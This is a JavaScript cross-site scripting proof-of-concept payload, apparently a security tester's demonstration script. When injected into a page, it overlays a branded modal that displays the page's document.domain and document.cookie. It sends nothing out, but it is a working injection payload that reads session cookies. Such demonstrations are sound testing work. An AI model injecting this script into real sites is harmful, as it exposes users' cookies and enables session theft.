var s=document.createElement('div');

html = "\
<style>\
.tss {\
    position: fixed; /* Stay in place */\
    z-index: 99999; /* Sit on top */\
    padding-top: 100px; /* Location of the box */\
    left: 0;\
    top: 0;\
    width: 100%; /* Full width */\
    height: 100%; /* Full height */\
    overflow: auto; /* Enable scroll if needed */\
    background-color: rgb(0,0,0); /* Fallback color */\
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */\
}\
\
/* TSS Content */\
.tss-content {\
    background-color: #fefefe;\
    margin: auto;\
    padding: 20px;\
    border: 1px solid #888;\
    width: 80%;\
}\
\
</style>\
\
<div id='myModal' class='tss'>\
  <div class='tss-content'>\
    <div style='text-align: center;'><img src=https://www.datacomtss.com.au/images/logo.png /><br><span style='font-size: larger'>Cross Site Scripting Proof Of Concept</span><br><br> Cross site scripting vulnerability exploited with the following environment: <br><br> " +
"<b>document.domain: </b><br>" +
document.domain + "<br><br>" +
"<b>document.cookie: </b><br>" +
document.cookie + "<br><br>" +
"</div>\
  </div>\
</div>\
";

s.innerHTML = html;
document.body.appendChild(s);

